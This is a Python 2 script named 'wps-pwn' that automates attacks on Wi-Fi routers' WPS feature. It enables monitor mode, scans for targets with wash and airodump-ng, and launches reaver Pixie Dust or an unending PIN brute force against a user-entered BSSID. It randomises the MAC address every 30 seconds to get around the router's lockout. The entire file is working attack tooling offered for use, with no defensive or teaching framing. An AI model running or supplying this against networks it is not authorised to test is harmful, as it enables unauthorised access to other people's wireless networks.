import os
import subprocess
import signal
import time
import sys
import re
import thread

###Static Configuration###### This is what you may want to edit ##################################

# wireless interface
intf = "wlan0"

# monitor interface
intf_mon = "wlan0mon"

# Duration before changing MAC address
mac_delay = "30s"
pixie_delay = "5m"
wash_delay = "2m"
airodump_delay = "2m"
####################################################################################################

#Logging
def logging():
	global logFlag
	logAnswer = raw_input('Would you like to enable logging? (y/n):')
	if logAnswer == "yes" or  logAnswer == "y":
		print "Enabling logging...\n"
		logFlag = 1
	elif logAnswer == "no" or logAnswer == "n":
		print "Logging disabled"
		logFlag = 0
	else:
		print "Input not recognized, please try again!"
		logging()

#Countdown timer
def countdown(t):
    minute_match = re.match(r'.*m',t)
    second_match = re.match(r'.*s',t)
    if minute_match: 
    	t = re.sub(r'm','',t)
    	t = int(t)
    	t = t * 60
    elif second_match:
     	t = re.sub(r's','',t)
    	t = int(t)
    else:
    	print "Countdown error: action delay configuration improperly formatted"  	
    while t:
        mins, secs = divmod(t, 60)
        timeformat = '{:02d}:{:02d}'.format(mins, secs)
    	sys.stdout.write(timeformat+'\r'),
    	sys.stdout.flush()
       	time.sleep(1)
        t -= 1

# Start airmon-ng
def airmonStart():
	print "Starting airmon-ng...."
	os.system("airmon-ng check kill")
	os.system("airmon-ng start " + intf)
	os.system("sleep 5s")
	print "Started!\n"

#Change the MAC
def macChange():
	print "Changing MAC address.."
	os.system("ifconfig " + intf_mon + " down")
	os.system("macchanger " + intf_mon + " -r")
	os.system("ifconfig " + intf_mon + " up")

#wash
def wash():
	global logFlag
	print "\nStarting wash...\n"
	macChange()
	if logFlag == 0:
		os.system("wash -i " + intf_mon + " &")
		thread.start_new_thread(countdown,(wash_delay,))
		os.system("sleep " + wash_delay)
		os.system("killall wash")
		os.system("sleep 3s")
	elif logFlag == 1:
		os.system("wash -i " + intf_mon  + " | tee --append WashLog.txt &")
		thread.start_new_thread(countdown,(wash_delay,))
		os.system("sleep " + wash_delay)
		os.system("killall wash")
		os.system("sleep 3s")
	else:
		print "Error, log flag not set!\nRedirecting to logging menu!\n"
		logging()

#airdump
def airodump():
	global logFlag
	print "\nStarting airodump-ng...\n"
	macChange()
	if logFlag == 0:
		os.system("airodump-ng " + intf_mon + " &")
		thread.start_new_thread(countdown,(airodump_delay,))
		os.system("sleep " + airodump_delay)
		os.system("killall airodump-ng")
		os.system("sleep 3s")
	elif logFlag == 1:
		os.system("airodump-ng " + intf_mon + " --output-format csv --write-interval 1 --write Airodump-ngLog &")
		thread.start_new_thread(countdown,(airodump_delay,))
		os.system("sleep " + airodump_delay)
		os.system("killall airodump-ng")
		os.system("sleep 3s")
	else:
		print "Error, log flag not set!\nRedirecting to logging menu!\n"
		logging()

# Pixie Dust
def pixieDust():
	global logFlag
	print "\nLet's begin attacking...\n"
	target = raw_input('Enter target BSSID: ')
	channel = raw_input('Enter target channel: ')
	print "Starting pixie dust attack..."
	macChange()
	if logFlag == 0:
		os.system("yes n | reaver -i " + intf_mon + " -b " + target + " -c " + channel + " -vvv -K 1 -f &")
		thread.start_new_thread(countdown,(pixie_delay,))
		os.system("sleep " + pixie_delay)
		os.system("killall reaver --signal SIGINT")
		os.system("sleep 3s")
	elif logFlag == 1:
		os.system("yes n | reaver -i " + intf_mon + " -b " + target + " -c " + channel + " -vvv -K 1 -f | tee --append PixieLog.txt &")
		thread.start_new_thread(countdown,(pixie_delay,))
		os.system("sleep " + pixie_delay)
		os.system("killall reaver --signal SIGINT")
		os.system("sleep 3s")
	else:
		print " Error, log flag not set!\nRedirecting to logging menu!\n"
		logging()

# Bruteforce
def bruteForce(): 
	global logFlag
	print "Starting pin bruteforce..."
	print "\nLet's begin attacking...\n"
	target = raw_input('Enter target BSSID: ')
	channel = raw_input('Enter target channel: ')
	counter = 0
	while counter >= 0:
		#Increment Tracking
		counter = counter + 1
		print ""
		print ""
		print ""
		print  "/////////////////MAC has been changed " + str(counter) + " times///////////////////////////////////////////"
		macChange()
		#Run reaver for 1 minute
		print "(re)starting reaver..."
		if logFlag == 0:
			os.system("yes y | reaver -i " + intf_mon + " -b  " + target + " -vvv &")
			thread.start_new_thread(countdown,(mac_delay,))
			os.system("sleep " + mac_delay)
			os.system("killall reaver --signal SIGINT")
			os.system("sleep 3s")
		elif logFlag == 1:
			os.system("yes y | reaver -i " + intf_mon + " -b  " + target + " -vvv | tee --append BruteForceLog.txt &")
			thread.start_new_thread(countdown,(mac_delay,))
			os.system("sleep " + mac_delay)
			os.system("killall reaver --signal SIGINT")
			os.system("sleep 3s")
		else: 
			print " Error, log flag not set!\nRedirecting to logging menu!\n"
			logging()

#Menu
def menu():
	global menu_counter
	menu_counter = menu_counter + 1
	if menu_counter == 1:
		logging()
		menu()
	else:
		print "current timers are..."
		print "mac delay: " + mac_delay
		print "wash runtime: " + wash_delay
		print "airodump-ng runtime: " + airodump_delay
		print "pixie runtime: " + pixie_delay + "\n"
		print "Choose an option (use CTRL+Z to stop execution if you don't want to wait)"
		reply = raw_input('1. wash prescan\n2. airodump-ng prescan\n3. wash and airodump-ng presscan\n4. reaver pixie dust attack\n5. reaver bruteforce attack\n\n-->: ')
		if reply == "1":
			wash()
			menu()
		elif reply == "2":
			airodump()
			menu()
		elif reply == "3":
			wash()
			airodump()
			menu()
		elif reply == "4":
 			pixieDust()
 			menu()
		elif reply == "5":
			bruteForce()
			menu()
		else:
			print "Input not recognized, please try again!"
			menu()	

# Execution
def execute():
	airmonStart()
	print "\nWelcome to wps-pwn\n"
	global menu_counter
	menu_counter = 0
	menu()

execute()
